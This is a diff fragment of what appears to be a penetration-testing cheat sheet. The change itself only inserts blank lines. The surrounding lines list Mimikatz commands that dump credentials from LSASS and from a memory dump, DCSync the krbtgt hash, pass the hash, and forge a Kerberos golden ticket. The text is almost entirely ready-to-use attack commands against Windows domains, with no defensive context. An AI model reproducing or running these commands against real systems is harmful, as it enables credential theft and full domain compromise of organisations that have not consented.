@@ -255,13 +255,17 @@ Loading Powershell Script
 Dumping credentials from LSASS   
     mimikatz # privilege::debug   
     mimikatz # sekurlsa::logonpasswords   
+    
 Dumping credentials from a minidump   
     mimikatz # sekurlsa::minidump lsass.dmp   
     mimikatz # sekurlsa::logonPasswords   
+    
 DCSync the krbtgt hash   
     mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt   
+ 
 Pass the hash   
     mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<cmd>   
+ 
 Golden ticket creation and pass the ticket   
     mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash>   
  
